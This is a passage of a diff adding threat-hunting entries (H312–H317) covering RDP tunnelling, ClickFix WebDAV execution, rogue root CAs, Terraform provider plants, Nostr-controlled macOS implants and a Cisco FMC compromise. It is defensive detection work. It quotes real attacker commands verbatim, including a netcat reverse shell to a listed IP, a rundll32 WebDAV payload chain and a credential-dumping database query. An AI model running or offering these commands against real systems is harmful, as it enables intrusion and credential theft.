+    ],
+    "techniques": [
+      "T1572",
+      "T1021.001",
+      "T1090.001"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [
+      "H311"
+    ],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **The tunnel is invisible to every network control by design.** Because the forwarded traffic is multiplexed into an already-established, already-authorised RDP stream, segmentation rules, egress filtering and port-based monitoring have nothing to act on. The only place the pivot is observable is in the host's own RDP subsystem logging, which means this behaviour is either caught here or not caught at all.\n- **The legitimate channel vocabulary is small enough to allowlist exhaustively.** Unlike most \"unusual X\" hunts, this one has a genuinely bounded benign set — a couple of dozen RemoteFX/RDS channels plus a stable, vendor-branded list from any VDI and redirection products in use. Enumerating it once turns an open-ended anomaly question into a short standing exception list, which is what makes the hunt sustainable rather than a one-off.\n- **It degrades gracefully against an operator who renames the channel.** A signature on the literal `rdp2tcp` is trivially evaded by choosing a random name, but the allowlist formulation is not — an unknown name is an unknown name regardless of what it is. That is why this is written as enumerate-and-review rather than as a string match.\n- **The required log is on by default and almost never collected, so the hunt has value even when it returns nothing.** RdpCoreTS/Operational ships enabled on every Windows Server and is one of the least commonly forwarded channels in the estate. Running this hunt establishes whether that telemetry exists at all on jump hosts and domain controllers — and an empty result usually means the log is not reaching the SIEM rather than that no tunnelling occurred.",
+    "references": "- [MITRE ATT&CK T1572 — Protocol Tunneling](https://attack.mitre.org/techniques/T1572/)\n- [MITRE ATT&CK T1021.001 — Remote Services: Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001/)\n- [MITRE ATT&CK T1090.001 — Proxy: Internal Proxy](https://attack.mitre.org/techniques/T1090/001/)\n- [NightEagle APT targets Russian organizations (Securelist / Kaspersky)](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)\n- [Microsoft-Windows-RemoteDesktopServices-RdpCoreTS ETW manifest (event 132/148 templates)](https://github.com/repnz/etw-providers-docs/blob/master/Manifests-Win10-17134/Microsoft-Windows-RemoteDesktopServices-RdpCoreTS.xml)\n- [Making Sense of RDP Connection Event Logs (FRSecure)](https://frsecure.com/blog/rdp-connection-event-logs/)\n- [Pentesting RDP — virtual channel tunnelling and pivoting techniques (HackTricks)](https://hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html)\n- [Atomic Red Team — T1572 Protocol Tunneling atomics](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1572/T1572.md)",
+    "file_path": "Flames/H312.md",
+    "created": null
+  },
+  {
+    "id": "H313",
+    "category": "Flames",
+    "title": "Clipboard-pasted pushd to a WebDAV share followed by rundll32 executing an extensionless payload by ordinal",
+    "tactic": "Execution, Defense Evasion, Command and Control",
+    "notes": "Core filter, the command line - Sysmon Event ID 1 / 4688 where `Image` ends with `\\rundll32.exe` and `CommandLine` contains ` \\\\` (a UNC path). Tighten with an ordinal reference (`#` followed by digits) and with a target filename whose extension is not `.dll`. Reported chain, verbatim - `\"pushd \\\\leaguejazire[.]com\\randomized_subdomain\\victim_id && rundll32.exe pf.ch #1 && popd\"`. Note the three defeats in one line - `pf.ch` is a DLL with a non-DLL extension, `#1` is ordinal invocation rather than a named export, and the victim identifier is embedded in the path so the operator can attribute each execution. A second observed build used the filename `verification.google` with named export `CfgInspectModuleData`; the `pf.ch` build exported `moor`. Hunt the SHAPE, not these names.\nCore filter, the WebClient service - System event 7045 or an SCM state change starting the `WebClient` service, correlated to the same host within minutes of the `rundll32` execution. WebDAV mounting requires WebClient, it is manual-start by default, and in most enterprises it never runs - so in a non-SharePoint environment this single event is a strong standalone lead. Where the environment does use WebDAV legitimately, drop this condition and scope on destination instead.\nCore filter, the paste - Sysmon Event ID 13 on `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU`. ClickFix depends on the victim pasting into the Run dialog, and RunMRU preserves exactly what was pasted, which is often the only surviving record of the lure. A RunMRU value containing `&&`, `powershell`, `rundll32`, `mshta`, `curl` or a UNC path is the artefact. This is also the pivot that proves USER EXECUTION rather than exploitation, which changes the incident's scope and the remediation conversation.\nNetwork correlation - Sysmon Event ID 3 from `rundll32.exe` or `svchost.exe` (WebClient runs under svchost) to an external host on 80/443, and Sysmon Event ID 22 DNS queries showing RANDOMISED SUBDOMAINS under a single registrable parent - reported infrastructure used a per-victim random subdomain of `leaguejazire[.]com`. Where proxy logs are available, WebDAV mounting emits `OPTIONS` and `PROPFIND` verbs, which are rare enough in ordinary browsing to be worth their own standing query. The macOS branch of the same campaign used `curl` with a distinctive user agent to a subdomain of `riyazinikokar[.]xyz`.\nRelated detection content - SigmaHQ carries `proc_creation_win_rundll32_unc_path.yml` (rundll32 executing a DLL from a remote share, `attack.t1218.011` / `attack.t1021.002`) and two WebDAV-specific rules keyed on `svchost.exe` spawning `rundll32.exe` with `C:\\windows\\system32\\davclnt.dll,DavSetCookie` - that `DavSetCookie` command line is a separate, very high-fidelity WebDAV artefact that names the attacker-controlled destination directly in the argument string, and is worth running alongside this hunt.\nFollow-on stage to pivot into - the loader in this chain unpacked Amatera stealer in memory with no disk write, resolved its C2 through a Telegraph dead-drop page (`telegra[.]ph/Functions-04-03`) to `145.249.109[.]147:443`, and in one branch dropped NetSupport Manager renamed `hypersnap.exe` into `%APPDATA%` with a logon-triggered scheduled task. See [[H270]] for the blockchain dead-drop resolution angle.\nTriage values - full `CommandLine`, `ParentImage`, `ParentCommandLine`, `User`, the UNC host, the payload filename and ordinal, `RunMRU` value, WebClient service start time, and DNS `QueryName`.\n",
+    "tags": [
+      "execution",
+      "defense_evasion",
+      "command_and_control",
+      "t1218_011",
+      "t1204_004",
+      "t1071",
+      "t1027",
+      "webdav",
+      "clickfix",
+      "rundll32",
+      "clearfake",
+      "amatera",
+      "webclient",
+      "windows",
+      "T1218.011",
+      "T1204.004",
+      "T1071",
+      "T1027"
+    ],
+    "techniques": [
+      "T1218.011",
+      "T1204.004",
+      "T1071",
+      "T1027"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [
+      "B049",
+      "H270"
+    ],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **The intersection is rare even though every element is individually common.** `rundll32` is ubiquitous, UNC paths are ordinary, and users paste things constantly — but `rundll32` with a UNC path in its arguments, pointing at an *external* host, is close to nonexistent in legitimate enterprise activity. Building the hunt on the intersection rather than on any single element is what keeps it operational at scale.\n- **WebDAV execution routes around the download-inspection pipeline entirely.** Most endpoint and email controls are positioned around files arriving through a browser or mail client, where mark-of-the-web, SmartScreen and download reputation all engage. A WebDAV mount delivers the payload as a file on a *mapped drive*, which none of that machinery evaluates — so the technique's whole value is bypassing controls that will report nothing.\n- **The WebClient service is a near-binary indicator in most estates.** It is manual-start, it exists only to support WebDAV, and outside SharePoint-mapped-drive shops it simply never runs. Where that holds, a single service-start event is a high-confidence lead; where it does not hold, the environment knows it does not hold, and destination scoping substitutes cleanly. Either way the answer is knowable in advance rather than discovered during triage.\n- **RunMRU converts an ambiguous execution into a proven social-engineering incident.** The pasted command survives in the user's Run history, which is frequently the only remaining evidence of the lure after the WebDAV share goes offline. That artefact settles whether this was exploitation or user execution — a distinction that determines scope, user-communication and remediation, and one that is otherwise very hard to establish after the fact.",
+    "references": "- [MITRE ATT&CK T1218.011 — System Binary Proxy Execution: Rundll32](https://attack.mitre.org/techniques/T1218/011/)\n- [MITRE ATT&CK T1204.004 — User Execution: Malicious Copy and Paste](https://attack.mitre.org/techniques/T1204/004/)\n- [ClearFake WebDAV infection chain delivers Amatera stealer (Cisco Talos)](https://blog.talosintelligence.com/clearfake-webdav-infection-chain/)\n- [SigmaHQ — Rundll32 UNC Path Execution (`proc_creation_win_rundll32_unc_path.yml`)](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_unc_path.yml)\n- [SigmaHQ — WebDav Client Execution Via Rundll32.EXE (`davclnt.dll,DavSetCookie`)](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_webdav_client_execution.yml)\n- [Suspicious WebDav Client Execution Via Rundll32.EXE (Detection.FYI)](https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_rundll32_webdav_client_susp_execution/)\n- [Atomic Red Team — T1218.011 Rundll32 atomics](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.md)",
+    "file_path": "Flames/H313.md",
+    "created": null
+  },
+  {
+    "id": "H314",
+    "category": "Flames",
+    "title": "Self-signed root CA impersonating Google Trust Services installed alongside a hosts-file entry and a local proxy firewall rule",
+    "tactic": "Defense Evasion, Credential Access, Collection",
+    "notes": "Core filter, the root CA - Sysmon Event ID 12/13 writing under `HKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\ROOT\\Certificates\\<thumbprint>`, where the writing process is not a known management agent (`gpsvc`/`svchost` for GPO, the Intune management extension, or your software-deployment agent). Then inspect the certificate itself. Reported values - Subject presented as Google Trust Services with `CN=WR3`, self-signed, with a leaf issued for `www.virustotal.com` whose SAN covers both the legitimate domain and `localhost`. Two structural tells that generalise past this campaign - a root whose subject impersonates a well-known public CA but whose ISSUER CHAIN terminates in itself, and a leaf for a public domain carrying `localhost` in its SAN, which is only ever useful for intercepting traffic that has been redirected to loopback. Enumerate current state with `Get-ChildItem Cert:\\LocalMachine\\Root` and diff against the [[B048]] register, and with `certutil -store Root` for detail.\nCore filter, the hosts file - Sysmon Event ID 11/2 on `%SystemRoot%\\System32\\drivers\\etc\\hosts`, followed by content inspection for any entry mapping a public domain to `127.0.0.1` or `::1`. Combined with a matching leaf certificate for that same domain, this pair is conclusive - the redirect sends the client to the local listener and the forged leaf makes the TLS handshake succeed. Neither artefact alone proves interception; together they are the mechanism.\nCore filter, the firewall rule - Windows Firewall event 2004 for a rule added with the name `LocalProxy` (reported) or any rule permitting inbound traffic to a binary in a user-writable or unexpected path. Enumerate with `Get-NetFirewallRule | Get-NetFirewallApplicationFilter` and reconcile every rule against an installed product.\nExecution chain to pivot on - the dropper masqueraded as a Lenovo driver package (`localcertificate.zip`, with a sibling `asusdriverld.zip` in the same campaign), signed with a STOLEN LENOVO certificate, and executed via hollowed `MsBuild.exe` that imported only `kernel32`. Hunt `MsBuild.exe` running outside a developer context, with no `.csproj`/`.sln`/project argument on its command line, and correlate Sysmon Event ID 8/25 and Defender `DeviceEvents` process-tampering signals. `MsBuild.exe` on a non-developer workstation is itself worth a standing query. The delivery chain reached the host through a fake \"Google API Connector\" ClickOnce application and an encoded PowerShell command pulling three encrypted payloads from `eu03hub[.]com/get_file`; the sibling payload in the same set persisted as a `Run` key named \"Ledger Wallet Installer\" pointing at a bare `msbuild` invocation.\nStolen-certificate angle - three different stolen code-signing certificates were used across this campaign (a Norwegian company's, Lenovo's, and Discord Inc.'s). Hunt for binaries whose signature is VALID but whose signer has no relationship to the file's apparent purpose or install path, and for signatures that fail validation while still carrying a recognisable corporate signer name.\nWhy this outlives the incident - of every artefact here, the root CA is the one most likely to survive cleanup. Killing the process and deleting the binary leaves the machine trusting an attacker CA indefinitely. Any remediation that does not explicitly enumerate and remove the root, the hosts entry and the firewall rule leaves the interception capability intact, which is why this hunt should be run against MACHINE TRUST STATE rather than against running processes.\nTriage values - certificate thumbprint, subject, issuer, validity dates, SAN list, the writing process and its parent, hosts-file contents, firewall rule name and program path, and `MsBuild.exe` command line and parent.\n",
+    "tags": [
+      "defense_evasion",
+      "credential_access",
+      "collection",
+      "t1553_004",
+      "t1055_012",
+      "t1553_002",
+      "t1090_001",
+      "root_certificate",
+      "tls_interception",
+      "msbuild",
+      "process_hollowing",
+      "hosts_file",
+      "stolen_code_signing",
+      "windows",
+      "T1553.004",
+      "T1055.012",
+      "T1553.002",
+      "T1090.001"
+    ],
+    "techniques": [
+      "T1553.004",
+      "T1055.012",
+      "T1553.002",
+      "T1090.001"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [
+      "B048"
+    ],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **Trust-store persistence is configuration, not code, so process-centric response misses it entirely.** Every standard containment step — terminate the process, quarantine the binary, block the C2 — leaves the root CA, the hosts entry and the firewall rule in place. A host that has been \"cleaned\" still trusts the adversary's certificate authority, which means the capability to intercept and to sign survives the incident unless someone hunts trust state explicitly.\n- **Impersonating a real public CA defeats human review at exactly the moment it matters.** An analyst scrolling the root store sees \"Google Trust Services\" and moves on. The structural tell is not the name but the chain: a genuine public root is cross-signed and widely deployed, while this one is self-signed and present on exactly one machine. That comparison is only cheap if the estate-wide register from [[B048]] already exists.\n- **The three artefacts only make sense together, which makes the combination near-unambiguous.** A root CA alone could be a developer tool; a hosts entry alone could be a workaround; a firewall rule alone could be an installer. All three, naming the same domain, with a leaf whose SAN pairs a public site with `localhost`, is an interception rig and admits no innocent reading.\n- **Stolen code-signing certificates break the assumption that signature equals provenance.** This campaign used three separate stolen certificates, and a payload signed by Lenovo installing into a user-writable path is trusted by controls keyed on valid signatures. Hunting for the mismatch between a valid signer and the file's actual purpose and location is what recovers signal once signing has stopped being evidence of legitimacy.",
+    "references": "- [MITRE ATT&CK T1553.004 — Subvert Trust Controls: Install Root Certificate](https://attack.mitre.org/techniques/T1553/004/)\n- [MITRE ATT&CK T1055.012 — Process Injection: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)\n- [MITRE ATT&CK T1553.002 — Subvert Trust Controls: Code Signing](https://attack.mitre.org/techniques/T1553/002/)\n- [Google Doc Sidebar Sends Mac and Windows Users Down Different Paths to Malware (Huntress)](https://www.huntress.com/blog/google-doc-sidebar-malware-mac-windows)\n- [Enabling CAPI2 Operational logging for certificate store diagnostics (Ivanti)](https://hub.ivanti.com/s/article/HOWTO-Enable-CAPI2-event-logging-for-investigating-certificate-related-issues?language=en_US)\n- [Atomic Red Team — T1553.004 Install Root Certificate atomics](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.004/T1553.004.md)\n- [Root CA Abuse as a stealth evasion technique — detection and hardening (Veil Framework)](https://www.veil-framework.com/root-ca-abuse-the-new-stealth-evasion-technique-of-2025-26/)",
+    "file_path": "Flames/H314.md",
+    "created": null
+  },
+  {
+    "id": "H315",
+    "category": "Flames",
+    "title": "terraform init pulling a provider from an attacker domain after a lock file is planted in a developer project",
+    "tactic": "Initial Access, Execution, Persistence",
+    "notes": "Core filter, the fetch - ESF `NOTIFY_EXEC` for a process whose executable is `terraform` with `init` in its argument vector, joined to DNS/SNI telemetry from that same process within the following seconds. Alert where the resolved provider source host is not `registry.terraform.io` and not a member of the sanctioned-registry allowlist. Terraform's provider source syntax makes the intended host explicit - a `required_providers` source of the form `<HOSTNAME>/<NAMESPACE>/<TYPE>` names the registry directly, so parsing `.terraform.lock.hcl` and the provider blocks in the project gives the answer statically, without waiting for the network event.\nCore filter, the lock file as the plant - ESF `NOTIFY_WRITE`/`_CREATE`/`_RENAME` on `.terraform.lock.hcl`. The lock file is normally generated BY `terraform init` and committed; a lock file that arrives with a downloaded project, references a non-registry host, and is then honoured on first `init` is the delivery mechanism. Worth a standing content check in any repository scanning - grep the estate's checked-out repositories for `.terraform.lock.hcl` and `required_providers` blocks naming hosts outside the allowlist, which finds the plant before anybody runs `init`.\nCore filter, post-fetch behaviour (the anchor condition) - ESF `NOTIFY_EXEC` where the responsible/parent process is a Terraform provider plugin binary under `.terraform/providers/` or `~/.terraform.d/plugins/`, and the child is a shell, `curl`, `osascript`, `nohup`, `chmod`, `xattr`, or anything writing to `~/Library/LaunchAgents/`. Provider plugins communicate with Terraform core over gRPC and do not spawn interpreters; this condition is close to noise-free and is what should carry the detection.\nIDE lineage - reported execution ran from Cursor's integrated terminal, with shells spawning seconds after the workspace opened and implants launched via `nohup`. Build the lineage query generically - IDE process (`Cursor`, `Code`, `IntelliJ`, `PyCharm`) as an ancestor of a shell, which is an ancestor of `terraform`. Treat this as scoping context that raises priority, not as a detection on its own.\nFollow-on payload to pivot into - this chain ended in two Rust ARM64 macOS backdoors. FLATROOF at `~/Library/com.apple.iTunesCloud/SystemUpdate` (Telegram bot token for exfil, lock file at `$TMPDIR/tmp*.lock`) and ROOFDECK at `~/Library/com.apple.internal.ck/iSync` (config at `$HOME/.config/.repl_history`, IPC pipe `/private/tmp/.pipe-airway`), both launched as `nohup .../<name> --type=renderer` to masquerade as Electron renderer children, with a LaunchAgent at `~/Library/LaunchAgents/loginwindow.plist` and Gatekeeper stripped via `xattr -rd com.apple.quarantine`. See [[H316]] for the Nostr-based C2 half.\nPopulation scoping - this targets engineers with cloud credentials and source-control access, which is precisely the population whose workstation compromise is most costly. Treat developer and platform-engineering Macs as a sensitive group for this hunt and run it there first rather than estate-wide.\nTriage values - full `terraform` argument vector, working directory, contents of `.terraform.lock.hcl` and `required_providers`, resolved provider host, provider plugin binary path and signature, child process list, responsible process, and any `~/Library/LaunchAgents/` writes in the following minutes.\n",
+    "tags": [
+      "initial_access",
+      "execution",
+      "persistence",
+      "t1195_002",
+      "t1059_004",
+      "t1204_002",
+      "terraform",
+      "supply_chain",
+      "tradertraitor",
+      "developer_workstation",
+      "fake_recruitment",
+      "iac",
+      "macos",
+      "T1195.002",
+      "T1059.004",
+      "T1204.002"
+    ],
+    "techniques": [
+      "T1195.002",
+      "T1059.004",
+      "T1204.002"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [
+      "H316"
+    ],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **Infrastructure-as-code tooling is an execution primitive that is not policed like one.** Application allowlisting, Gatekeeper, notarisation and macro controls all sit outside this path. `terraform init` fetching and running a plugin is the tool's designed behaviour, so there is no policy violation to detect — only a destination that should not be there, which means the organisation has to know its own sanctioned registry set to have any opinion at all.\n- **The provider source is declarative, so the attack is detectable statically before anyone runs anything.** Unlike most initial-access techniques, the malicious intent is written down in a committed text file. Grepping checked-out repositories for `required_providers` blocks naming hosts outside the allowlist finds the plant at rest, which turns this from an incident-response problem into an inventory sweep.\n- **Provider plugins have an unusually rigid legitimate behaviour profile, which makes the anchor condition nearly noise-free.** A Terraform provider talks gRPC to Terraform core and does essentially nothing else. It does not spawn shells, call `curl`, invoke `osascript`, run `nohup` or write LaunchAgents. That rigidity is rare and valuable — it supports a detection with almost no benign volume, independent of which domain this particular campaign used.\n- **The victim population is the one where compromise compounds fastest.** These are engineers holding cloud credentials, CI/CD access and source-control write permissions. A backdoor here is not one workstation; it is a path into the build pipeline and the cloud estate, which is why SentinelOne recommends treating this group as a distinct monitoring tier and why this hunt should run there first.",
+    "references": "- [MITRE ATT&CK T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain](https://attack.mitre.org/techniques/T1195/002/)\n- [MITRE ATT&CK T1059.004 — Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/)\n- [MITRE ATT&CK T1204.002 — User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/)\n- [Don't Call Us, We'll Call Your APIs — TraderTraitor backdoors resurface (SentinelOne Labs)](https://www.sentinelone.com/labs/dont-call-us-well-call-your-apis-tradertraitor-backdoors-resurface-on-victim-with-no-crypto-ties/)\n- [HashiCorp — Provider requirements and source addresses (`<HOSTNAME>/<NAMESPACE>/<TYPE>`)](https://developer.hashicorp.com/terraform/language/providers/requirements)\n- [HashiCorp — Dependency lock file (`.terraform.lock.hcl`) behaviour](https://developer.hashicorp.com/terraform/language/files/dependency-lock)\n- [Apple — Endpoint Security Framework event types (`ES_EVENT_TYPE_NOTIFY_EXEC`)](https://developer.apple.com/documentation/endpointsecurity)",
+    "file_path": "Flames/H315.md",
+    "created": null
+  },
+  {
+    "id": "H316",
+    "category": "Flames",
+    "title": "macOS implant taking signed commands from Nostr relays, masquerading as an Electron renderer child",
+    "tactic": "Command and Control, Persistence, Defense Evasion",
+    "notes": "Core filter, relay discovery - DNS or SNI telemetry showing a resolution of `api.nostr[.]watch` (the live-relay directory the implant queries at `/v1/online`), or connections to public relays. Reported hardcoded relay list, verbatim - `wss://relay.damus[.]io`, `wss://nos[.]lol`, `wss://nostr[.]mom`, `wss://relay.snort[.]social`, `wss://offchain[.]pub`, `wss://relay.nostr[.]band`, `wss://nostr.oxtr[.]dev`, `wss://nostr[.]wine`. The directory lookup is the better standing detection because it is a single hostname the implant must reach to find CURRENT relays, whereas the hardcoded list will rotate.\nCore filter, the masquerade - ESF `NOTIFY_EXEC` where the argument vector contains `--type=renderer` AND the executable path is not inside a `.app` bundle, OR the binary is unsigned, OR its team ID does not match the vendor whose Electron app it is imitating. Reported paths - `~/Library/com.apple.iTunesCloud/SystemUpdate` (FLATROOF), `~/Library/com.apple.internal.ck/iSync` (ROOFDECK), `~/Library/com.apple.appleaccountd/loginwindow` (stripped ROOFDECK build). Note the directory-naming tradecraft - these imitate Apple bundle identifiers to blend into `~/Library` listings, so a generic condition worth hunting is any EXECUTABLE Mach-O sitting directly inside a `~/Library/com.apple.*` directory, which Apple itself does not do.\nCore filter, persistence - ESF file events creating `~/Library/LaunchAgents/loginwindow.plist`, and more generally any LaunchAgent whose `ProgramArguments` include `--type=renderer` or point at a binary outside an `.app` bundle. Enumerate current state with `launchctl list` and by reading every plist in `~/Library/LaunchAgents/` and `/Library/LaunchDaemons/`, checking each referenced binary with `codesign -dvvv --verbose=4 <path>` and `spctl --assess --verbose <path>`.\nGatekeeper and permissions - correlate execution of `xattr -rd com.apple.quarantine <path>` and `chmod +x <path>` against the same paths, which is how the implants were made runnable. Reported commands operate on the `~/Library/com.apple.internal.ck/iSync` path.\nSupporting artefacts - ROOFDECK stores configuration at `$HOME/.config/.repl_history` (a filename chosen to look like shell history) holding `server_url`, `connection_type`, `nostr_public_keys`, `recovery_url`, `pastebin_key`, `rsa_private_key` and `interval`; it uses `/private/tmp/.pipe-airway` as an IPC pipe and falls back to HTTPS polling of a hardcoded `/app_version` endpoint with a PINNED certificate. FLATROOF exfiltrates over Telegram with an embedded bot token and uses a lock file at `$TMPDIR/tmp*.lock`. Reported fallback C2 - `technicais.sytes[.]net` (176.97.114.232), `storage.hubpage[.]cloud` (45.11.59.140), `grenight[.]com` (85.137.56.245).\nBeaconing behaviour worth knowing before you model it - the implants are GATED ON CURSOR SESSIONS and beacon only while the IDE is running, going quiet when it is closed. Any interval-based beacon analysis will see an intermittent, human-schedule-shaped pattern rather than a steady heartbeat, which is exactly what most beacon detection is built to ignore.\nTriage values - executable path, code-signing status and team ID, full argument vector, responsible process, LaunchAgent plist path and `ProgramArguments`, relay hostnames contacted, connection duration, and the presence of `.config/.repl_history` or `/private/tmp/.pipe-airway`.\n",
+    "tags": [
+      "command_and_control",
+      "persistence",
+      "defense_evasion",
+      "t1102_002",
+      "t1543_001",
+      "t1036_005",
+      "t1553_001",
+      "nostr",
+      "roofdeck",
+      "flatroof",
+      "tradertraitor",
+      "launchagent",
+      "websocket",
+      "macos",
+      "T1102.002",
+      "T1543.001",
+      "T1036.005",
+      "T1553.001"
+    ],
+    "techniques": [
+      "T1102.002",
+      "T1543.001",
+      "T1036.005",
+      "T1553.001"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [
+      "H315",
+      "H270"
+    ],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **Key-addressed C2 breaks the assumption that blocking infrastructure disrupts an operator.** Every response playbook step — block the domain, sinkhole the IP, revoke the certificate, request a takedown — assumes the adversary is reachable at an address you can deny. Here the rendezvous is a public key on a decentralised network, so denying any individual relay costs the operator nothing and the implant simply finds them elsewhere.\n- **The renderer masquerade is chosen precisely to exploit how defenders filter.** `--type=renderer` is among the most common arguments on any modern Mac because every Electron app produces them in volume, so an analyst's instinct is to exclude it wholesale. Adding the bundle, signature and team-ID conditions costs almost nothing and converts the adversary's best camouflage into one of the most specific conditions available.\n- **Apple-impersonating directories under `~/Library` are a generic, durable tell.** Apple does not place executable Mach-O binaries directly inside `~/Library/com.apple.*` directories. That makes the pattern — rather than the three specific paths this campaign used — a standing detection that survives renaming, and one that can be swept across a fleet cheaply with a file inventory.\n- **The Cursor-gated beaconing defeats interval analysis in a way worth knowing in advance.** Because the implants only beacon while the IDE runs, their traffic has a human, bursty, working-hours shape rather than a regular heartbeat — the exact profile beacon-detection models are tuned to dismiss as benign. Knowing that steers the hunt to process identity and persistence artefacts instead of wasting effort on timing analysis that is structurally unable to see this.",
+    "references": "- [MITRE ATT&CK T1102.002 — Web Service: Bidirectional Communication](https://attack.mitre.org/techniques/T1102/002/)\n- [MITRE ATT&CK T1543.001 — Create or Modify System Process: Launch Agent](https://attack.mitre.org/techniques/T1543/001/)\n- [MITRE ATT&CK T1036.005 — Masquerading: Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005/)\n- [MITRE ATT&CK T1553.001 — Subvert Trust Controls: Gatekeeper Bypass](https://attack.mitre.org/techniques/T1553/001/)\n- [Don't Call Us, We'll Call Your APIs — TraderTraitor backdoors resurface (SentinelOne Labs)](https://www.sentinelone.com/labs/dont-call-us-well-call-your-apis-tradertraitor-backdoors-resurface-on-victim-with-no-crypto-ties/)\n- [Apple — Endpoint Security Framework event types](https://developer.apple.com/documentation/endpointsecurity)\n- [Apple — `launchd` and Launch Agent property list keys](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html)",
+    "file_path": "Flames/H316.md",
+    "created": null
+  },
+  {
+    "id": "H317",
+    "category": "Flames",
+    "title": "Cisco Secure FMC package_info.pl invoked against a staged license.tmp to execute attacker code as root",
+    "tactic": "Execution, Persistence, Credential Access, Collection",
+    "notes": "Core filter, the LOTL root execution - process execution or command logging showing `/usr/local/sf/bin/package_info.pl` invoked against a path under `/var/tmp/`. Reported command, verbatim - `/usr/local/sf/bin/package_info.pl /var/tmp/license.tmp --lsm`. The staged file is a Makeself self-extracting archive, so a Makeself header (`#!/bin/sh` followed by the characteristic `# This script was generated using Makeself` banner) in any file under `/var/tmp` is a direct content-level indicator. Two clusters used this same primitive independently, which is a strong signal it is a stable property of the platform rather than one actor''s trick.\nCore filter, the web shell - any `.jsp` file in the Tomcat webroot that is not part of the vendor''s shipped file inventory. Reported artefact - `home[.]jsp` (SHA-256 `b037f45e02a289325a1a5eb0d4db6a9fce9954fd0fdfd07162cb4eb2acbef77d`). Pair with Tomcat access logs showing `POST` requests to that URI from a small number of external source addresses. Because the appliance''s webroot inventory is fixed between upgrades, a simple diff against a known-good file list is the highest-value periodic check available here.\nCore filter, credential access - execution of the bundled JRE against a dropped JAR, reported verbatim as `/var/jre/bin/java -jar cmd.jar ''/var/sf/bin/OmniQuery.pl -db mdb -e ''SELECT name, auth_data FROM users;''''` (`cmd.jar` SHA-256 `db491181ece3f319de6567ab6f6daa90c6879911cd890155e6b7d8cc7a1a8c8e`). Any query against the FMC user table selecting `auth_data` should be treated as credential theft and as an incident, not a hunt lead - and it means every credential on that appliance must be considered compromised, including those used to manage downstream firewalls.\nPersistence and implant - files added under `/etc/init.d/` for boot persistence, and the Cyclops Blink ELF implant (SHA-256 `6f98add5d1a7729192b6ad8491d85c505c64836f7881742d6b93bd8e3d2fe461`). One cluster also modified `license.tmp` with Makeself and harvested managed-device configurations into archives, which is the step that converts FMC compromise into exposure of every firewall it manages.\nReverse shell and tunnelling - reported reverse shell, verbatim - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 208[.]123[.]119[.]215 3090 >/tmp/f`. A third cluster deployed a SOCKS5 proxy and reverse-SSH tunnel forwarding ports 389, 636, 88, 445, 135 and 5985 - that port list is an Active Directory target set, so any FMC originating outbound connections, and especially connections to internal AD infrastructure, is anomalous by definition. An FMC has a narrow and knowable set of destinations it should ever contact; enumerate it and alert on everything else.\nReported network indicators - `89.34.96[.]56`, `208.123.119[.]215` (port 3090), `91.214.78[.]118`, `43.204.2[.]142`, and `104.218.165[.]253` observed scanning. Snort coverage - SIDs 66075-66080, 66883, 66960, 66961.\nScoping and exposure - CVE-2026-20079 is an unauthenticated authentication bypass yielding root; CVE-2026-20316 lets a remote attacker log in with a low-privileged account and is chained for escalation. The first hunt output should be an inventory question rather than a log query - which FMC instances exist, at what version, and is any management interface reachable from an untrusted network. Ransomware (Qilin, with AV killers) was deployed in one cluster, so treat any hit as time-critical.\nTriage values - executing binary and full argument vector, target file path and its Makeself header, webroot file inventory diff, Tomcat access log source IPs and URIs, `/etc/init.d/` additions, outbound destination addresses and ports, and appliance version and patch level.\n",
+    "tags": [
+      "execution",
+      "persistence",
+      "credential_access",
+      "collection",
+      "t1505_003",
+      "t1059_004",
+      "t1190",
+      "t1552",
+      "t1602",
+      "cisco",
+      "firewall_management_center",
+      "cve_2026_20079",
+      "cve_2026_20316",
+      "edge_device",
+      "living_off_the_land",
+      "network_devices",
+      "T1505.003",
+      "T1059.004",
+      "T1190",
+      "T1552",
+      "T1602"
+    ],
+    "techniques": [
+      "T1505.003",
+      "T1059.004",
+      "T1190",
+      "T1552",
+      "T1602"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
